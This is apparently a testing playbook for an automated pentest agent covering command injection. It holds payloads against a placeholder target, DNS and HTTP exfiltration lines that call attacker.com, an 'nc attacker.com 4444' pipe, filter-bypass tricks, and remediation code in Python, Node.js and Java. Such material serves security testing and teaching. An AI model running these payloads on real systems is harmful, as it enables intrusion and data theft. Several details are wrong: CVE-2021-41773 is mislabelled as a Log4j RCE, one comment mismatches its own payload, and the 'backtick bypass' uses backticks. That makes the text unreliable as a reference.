# Agent-0020: Command Injection Variants & Out-of-Band Exfiltration

## 🎯 Objectives

Comprehensive testing of command injection vulnerabilities including blind injection and data exfiltration:
- Direct command execution testing
- Blind command injection detection
- Out-of-band (DNS/HTTP) exfiltration
- Metacharacter variations
- OS-specific payload adaptation

## 📋 Scope & Dependencies

**Depends On**:
- Agent-001 (Reconnaissance)
- Agent-002G (Path Traversal)

**Tools Required**:
- `commix` (Automated detection)
- `curl`
- `nc` (Netcat)
- `dig` / `nslookup`
- Burp Suite
- Custom Python payloads

## 🔍 Testing Techniques

### 1. Direct Command Injection

```bash
# Test basic command separators
curl "https://target.api/search?q=test; id"
curl "https://target.api/search?q=test && id"
curl "https://target.api/search?q=test | id"
curl "https://target.api/search?q=test || id"
curl "https://target.api/search?q=test\`id\`"
curl "https://target.api/search?q=test$(id)"
```

### 2. Blind Command Injection Detection

```bash
# Test with time delay
curl "https://target.api/search?q=test; sleep 5; echo done"
# If response delays: Command injection confirmed

# Test with file write
curl "https://target.api/search?q=test; touch /tmp/pwned"
# Then verify: ls -la /tmp/pwned
```

### 3. Out-of-Band DNS Exfiltration

```bash
# 1. Setup DNS listener
dig @dns.attacker.com any subdomain.target.attacker.com +short

# 2. Inject command with DNS callback
curl "https://target.api/search?q=test; nslookup \$(id).attacker.com"
# Server will perform DNS query: whoami.attacker.com

# 3. Exfiltrate data
curl "https://target.api/search?q=test; nslookup \$(whoami).attacker.com"
# Result: user.attacker.com
```

### 4. Out-of-Band HTTP Exfiltration

```bash
# Setup HTTP listener
nc -lvnp 8888

# Inject command with HTTP callback
curl "https://target.api/search?q=test; curl http://attacker.com/\$(whoami)"

# Retrieve output from HTTP logs
# GET /admin HTTP/1.1 (indicates user is 'admin')
```

### 5. Polyglot Payloads (Work on Multiple Shells)

```bash
# Bash + sh compatible
test; id

# Bash + sh + Windows
test & whoami

# All shells (using semicolon)
;id;

# Command grouping
(id)
{id}
```

## 📊 Expected Findings

### Critical Findings
1. **Remote Code Execution via Command Injection**
   - CVSS: 9.8 (Critical)
   - Direct command execution confirmed

2. **Blind Command Injection with OOB Exfiltration**
   - CVSS: 9.1 (Critical)
   - Blind exploitation possible via DNS/HTTP

### High Findings
3. **Command Injection in Input Parameters**
   - CVSS: 8.6 (High)
   - Multiple parameters vulnerable

4. **Error Messages Reveal Command Output**
   - CVSS: 7.5 (High)
   - Timing-based detection confirmed

## 🛡️ Remediation Code Examples

### Vulnerable Code (Python/Flask)
```python
# BAD: Direct command execution
import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route('/search')
def search():
    query = request.args.get('q', '')
    # ❌ Dangerous: User input directly in shell command
    result = subprocess.check_output(f"grep {query} database.txt", shell=True)
    return {"results": result}
```

### Fixed Code
```python
# GOOD: Parameterized execution, no shell
import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route('/search')
def search():
    query = request.args.get('q', '')
    # ✅ Safe: Input passed as argument, no shell interpretation
    result = subprocess.check_output(['grep', query, 'database.txt'])
    return {"results": result.decode()}

# GOOD: Input validation & sanitization
import shlex
import re

ALLOWED_CHARS = r'^[a-zA-Z0-9\s\-\.]+$'

@app.route('/search')
def search():
    query = request.args.get('q', '')
    
    # Validate input
    if not re.match(ALLOWED_CHARS, query):
        return {"error": "Invalid characters"}, 400
    
    # Safe execution
    result = subprocess.check_output(['grep', query, 'database.txt'])
    return {"results": result.decode()}
```

### Node.js/Express
```javascript
// BAD: Command injection
const { exec } = require('child_process');
app.get('/search', (req, res) => {
    const query = req.query.q;
    exec(`grep ${query} database.txt`, (err, stdout) => {
        res.json({ results: stdout });
    });
});

// GOOD: Safe execution
const { execFile } = require('child_process');
app.get('/search', (req, res) => {
    const query = req.query.q;
    execFile('grep', [query, 'database.txt'], (err, stdout) => {
        res.json({ results: stdout });
    });
});
```

### Java
```java
// BAD: Runtime.exec with command string
public void search(String query) throws Exception {
    String cmd = "grep " + query + " database.txt"; // ❌ Injection
    Process p = Runtime.getRuntime().exec(cmd);
}

// GOOD: Array-based execution
public void search(String query) throws Exception {
    String[] cmd = {"grep", query, "database.txt"}; // ✅ Safe
    Process p = Runtime.getRuntime().exec(cmd);
}
```

## ✅ Success Criteria

- [ ] Basic command injection confirmed
- [ ] Blind injection detected (timing/OOB)
- [ ] DNS exfiltration successful
- [ ] HTTP callback data retrieved
- [ ] Multiple metacharacter combinations tested
- [ ] OS-specific payloads validated
- [ ] Clear remediation code provided
- [ ] CVSS scoring justified

## 🔗 Related CVEs & References

- CVE-2021-41773: Apache Log4j RCE
- CWE-78: OS Command Injection
- OWASP A03:2021 - Injection
- Payload All The Things: https://github.com/swisskyrepo/PayloadsAllTheThings

## 🛠️ Advanced Techniques

### Filter Bypass

```bash
# Bypass quotes
test$(id)

# Bypass backticks
test$(id)
test`id`

# Bypass pipes
test | nc attacker.com 4444

# Bypass semicolon
test\nid

# Bypass spaces (IFS=$'\t')
grep$IFS-r$IFSpassword$IFS/etc/
```

### Variable Manipulation

```bash
# Using positional parameters
${@}id

# Using environment variables
echo $HOME
ping $(echo$IFS10.0.0.1)
```
